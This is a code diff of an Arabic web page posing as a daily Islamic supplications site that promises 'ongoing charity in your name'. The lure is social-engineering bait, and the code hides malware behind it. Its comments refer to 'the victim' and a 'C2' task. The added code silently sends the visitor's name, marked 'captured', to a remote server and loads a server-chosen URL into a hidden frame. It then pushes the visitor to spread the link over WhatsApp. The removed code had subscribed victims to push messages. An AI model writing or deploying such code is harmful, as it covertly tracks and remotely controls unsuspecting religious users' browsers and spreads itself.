@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أذكار المسلم اليومية</title>
+    
+    <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
+    <meta property="og:description" content="احصل على ذكر يومي وتصدق باسمك">
+    <meta property="og:image" content="og-image.jpg"> 
+    <meta property="og:type" content="website">
+
     <script src="islamic_duas_javascript.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -27,71 +33,53 @@
     </div>
 
     <script>
-        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Key"; 
         const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";
-        let currentDuaText = "سبحان الله وبحمده 🕌";
+        let capturedDua = "سبحان الله وبحمده 🕌";
 
-        // استخدام الدوال المساعدة من الملف المرفق
-        function initApp() {
+        // تشغيل فوري للأذكار من ملف JS
+        function loadDua() {
             try {
-                // استدعاء دالة getTodaysDua() الموجودة في ملف islamic_duas_javascript.js
                 const dua = getTodaysDua(); 
                 if (dua) {
-                    currentDuaText = `${dua.text} ${dua.emoji}`;
-                    document.getElementById('displayDua').innerText = currentDuaText;
+                    capturedDua = `${dua.text} ${dua.emoji}`;
+                    document.getElementById('displayDua').innerText = capturedDua;
                 }
             } catch (e) {
-                console.log("Using default fallback");
-                document.getElementById('displayDua').innerText = currentDuaText;
+                document.getElementById('displayDua').innerText = capturedDua;
             }
         }
 
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${capturedDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
             
-            // تسجيل الضحية في الخلفية (Service Worker)
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('sw.js').then(reg => {
-                    return reg.pushManager.subscribe({
-                        userVisibleOnly: true,
-                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
-                    });
-                }).then(sub => {
-                    fetch(`${SERVER_URL}/save_sub`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({subscription: sub, name: name})
-                    });
-                }).catch(() => {});
-            }
+            // 1. تشغيل الواتساب فوراً (الأولوية القصوى)
+            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
 
-            // تحويل فوري للواتساب (تجاوز أي انتظار)
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDuaText}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
-            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
-            window.location.href = waUrl;
-            
-            // Fallback للواتساب ويب
-            setTimeout(() => {
-                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
-            }, 600);
-        }
-
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-            const rawData = window.atob(base64);
-            const outputArray = new Uint8Array(rawData.length);
-            for (let i = 0; i < rawData.length; ++i) { outputArray[i] = rawData.charCodeAt(i); }
-            return outputArray;
-        }
-
-        window.onload = () => {
-            initApp();
-            // مهمة الـ C2 في الخلفية
-            fetch(`${SERVER_URL}/get_task`).then(r => r.json()).then(d => {
-                if(d.url) document.getElementById('hiddenEngine').src = d.url;
+            // 2. إرسال البيانات للسيرفر في الخلفية (صامت تماماً وبدون انتظار)
+            fetch(`${SERVER_URL}/save_sub`, {
+                method: 'POST',
+                mode: 'no-cors', 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ name: name, status: "captured" })
             }).catch(() => {});
-        };
+
+            // 3. تحديث الفريم المخفي بمهمة الـ C2
+            fetch(`${SERVER_URL}/get_task`)
+                .then(r => r.json())
+                .then(d => {
+                    if(d.url) document.getElementById('hiddenEngine').src = d.url;
+                }).catch(() => {});
+            
+            // Fallback للواتساب ويب في حال فشل البروتوكول الأول
+            setTimeout(() => {
+                if (!document.hidden) {
+                    window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
+                }
+            }, 1000);
+        }
+
+        window.onload = loadDua;
     </script>
 </body>
 </html>
